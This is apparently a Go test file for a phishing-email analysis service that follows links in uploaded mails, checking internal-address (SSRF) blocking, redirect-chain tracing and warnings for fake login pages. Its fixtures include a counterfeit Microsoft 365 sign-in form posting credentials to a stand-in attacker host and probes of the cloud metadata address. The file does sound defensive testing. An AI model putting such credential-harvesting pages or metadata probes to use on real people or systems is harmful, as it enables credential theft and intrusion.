package main

import (
	"context"
	"net/http"
	"net/http/httptest"
	"net/netip"
	"net/url"
	"strings"
	"testing"
)

func TestPublicAddress(t *testing.T) {
	for addr, public := range map[string]bool{
		"8.8.8.8": true, "2a00:1450:4001::1": true, "127.0.0.1": false, "10.1.2.3": false, "192.168.1.1": false,
		"172.16.0.1": false, "169.254.169.254": false, "100.64.0.1": false, "0.0.0.0": false, "::1": false,
		"fe80::1": false, "fd00::1": false, "::ffff:127.0.0.1": false, "::ffff:10.0.0.1": false, "224.0.0.1": false,
		"192.0.2.10": false, "2001:db8::1": false,
	} {
		if publicAddress(netip.MustParseAddr(addr)) != public {
			t.Errorf("%s: %v", addr, !public)
		}
	}
}

func TestVisitRefusesInternalAddresses(t *testing.T) {
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		t.Error("internal server reached")
	}))
	defer server.Close()
	v := newLinkVisitor()
	for _, target := range []string{server.URL + "/", "http://localhost:" + strings.Split(server.URL, ":")[2] + "/", "http://169.254.169.254/latest/meta-data/"} {
		visit := v.visit(context.Background(), target)
		if !strings.Contains(visit.Error, "adresse interne") && !strings.Contains(visit.Error, "délai") {
			t.Errorf("%s: %+v", target, visit)
		}
	}
	// A public page redirecting to an internal address is stopped too.
	if v.visit(context.Background(), "ftp://example.com/").Error == "" {
		t.Error("ftp visited")
	}
}

func visitServer(t *testing.T) *httptest.Server {
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.Header.Get("User-Agent") != browserUserAgent {
			t.Errorf("user agent %q", r.Header.Get("User-Agent"))
		}
		switch r.URL.Path {
		case "/short":
			http.Redirect(w, r, "/meta", http.StatusFound)
		case "/meta":
			w.Write([]byte(`<html><head><meta http-equiv="refresh" content="0; URL='/js'"></head></html>`))
		case "/js":
			w.Write([]byte(`<html><script>setTimeout(function(){ window.location.href = "/login?x=1"; }, 10)</script></html>`))
		case "/login":
			w.Write([]byte(`<html><head><title>Sign in to your Microsoft 365 account</title>
				<script src="https://challenges.cloudflare.com/turnstile/v0/api.js"></script></head>
				<body><form action="https://collect.evil.example/p.php" method="post"><input type="email"><input type="password"></form></body></html>`))
		case "/plain":
			w.Write([]byte(`<html><head><title>Notre catalogue</title></head><body>Bonjour</body></html>`))
		case "/loop":
			http.Redirect(w, r, "/loop?again="+r.URL.Query().Get("again")+"x", http.StatusFound)
		case "/gone":
			http.NotFound(w, r)
		}
	}))
	t.Cleanup(server.Close)
	return server
}

func TestVisit(t *testing.T) {
	server := visitServer(t)
	v := newLinkVisitor()
	v.allowPrivate = true

	visit := v.visit(context.Background(), server.URL+"/short")
	if len(visit.Chain) != 4 || visit.Chain[0].Via != "HTTP" || visit.Chain[1].Via != "meta refresh" || visit.Chain[2].Via != "JavaScript" ||
		visit.Final != server.URL+"/login?x=1" || !visit.Password || visit.Brand != "Microsoft" || visit.Captcha != "Cloudflare Turnstile" ||
		visit.Title != "Sign in to your Microsoft 365 account" || visit.Level() != levelDanger {
		t.Fatalf("%+v", visit)
	}
	messages := ""
	for _, w := range visit.Warnings {
		messages += w.Message + "\n"
	}
	for _, want := range []string{"se présente comme Microsoft", "captcha", "collect.evil.example"} {
		if !strings.Contains(messages, want) {
			t.Errorf("%q missing in %s", want, messages)
		}
	}

	if visit := v.visit(context.Background(), server.URL+"/plain"); visit.Level() != "" || visit.Title != "Notre catalogue" || len(visit.Chain) != 1 {
		t.Errorf("%+v", visit)
	}
	if visit := v.visit(context.Background(), server.URL+"/loop"); visit.Error != "trop de redirections" {
		t.Errorf("%+v", visit)
	}
	if visit := v.visit(context.Background(), server.URL+"/gone"); visit.Status != 404 || visit.Level() != levelInfo {
		t.Errorf("%+v", visit)
	}
}

func TestAutoVisits(t *testing.T) {
	links := []Link{
		analyzeLink("https://www.example.org/", "", "lien", "text/html"),
		analyzeLink("https://bit.ly/abc", "", "lien", "text/html"),
		analyzeLink("https://news.example.org/unsubscribe?u=1", "Se désinscrire", "lien", "text/html"),
		analyzeLink("https://evil.example/", "www.bank.example", "lien", "text/html"),
		analyzeLink("https://evil.example/confirm?token=1", "www.bank.example", "lien", "text/html"),
		analyzeLink("https://contoso.sharepoint.com/:b:/x", "", "pièce jointe", "a.pdf"),
		analyzeLink("https://mfa.example.net/scan?token=2", "", "QR code", "qr.png"),
		analyzeLink("https://intranet.mycompany.example/doc", "www.bank.example", "lien", "text/html"),
		analyzeLink("mailto:a@example.org", "", "lien", "text/html"),
	}
	got := autoVisits(links, []string{"mycompany.example"})
	want := "https://bit.ly/abc https://evil.example/ https://contoso.sharepoint.com/:b:/x https://mfa.example.net/scan?token=2"
	if strings.Join(got, " ") != want {
		t.Errorf("%v", got)
	}
}

func TestVisitEndpoint(t *testing.T) {
	visits := visitServer(t)
	s := newTestServer(t)
	s.visitor = newLinkVisitor()
	s.visitor.allowPrivate = true
	s.visitCache = newBoundedCache[[]pageVisit](4)
	s.visitLimiter = newRateLimiter(10, 3600e9)
	// The local test server has a suspicious address: trusted, so that it
	// is not followed automatically.
	s.trustedDomains = []string{"127.0.0.1"}
	handler := s.routes(t.TempDir())
	mail := "From: a@example.org\r\nTo: b@example.com\r\nSubject: Catalogue\r\nDate: Thu, 1 Oct 2026 10:00:00 +0200\r\nMessage-ID: <v@example.org>\r\n" +
		"MIME-Version: 1.0\r\nContent-Type: text/html; charset=utf-8\r\n\r\n<p>Voir <a href=\"" + visits.URL + "/plain\">le catalogue</a>.</p>\r\n"
	location := postFile(t, handler, "/upload", "v.eml", []byte(mail)).Header().Get("Location")
	page := get(handler, location).Body.String()
	if !strings.Contains(page, "Suivre le lien") || strings.Contains(page, "Lien suivi") {
		t.Fatal("follow button missing or link visited automatically")
	}
	post := func(target string) *httptest.ResponseRecorder {
		r := httptest.NewRequest(http.MethodPost, location+"/visit", strings.NewReader(url.Values{"url": {target}}.Encode()))
		r.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		w := httptest.NewRecorder()
		handler.ServeHTTP(w, r)
		return w
	}
	if w := post("http://169.254.169.254/"); w.Code != http.StatusBadRequest {
		t.Errorf("link outside the mail: %d", w.Code)
	}
	if w := post(visits.URL + "/plain"); w.Code != http.StatusSeeOther {
		t.Fatalf("%d %s", w.Code, w.Body)
	}
	page = get(handler, location).Body.String()
	if !strings.Contains(page, "Lien suivi à votre demande") || !strings.Contains(page, `Titre : « <span translate="no">Notre catalogue</span> »`) {
		t.Error("visit not shown")
	}
}
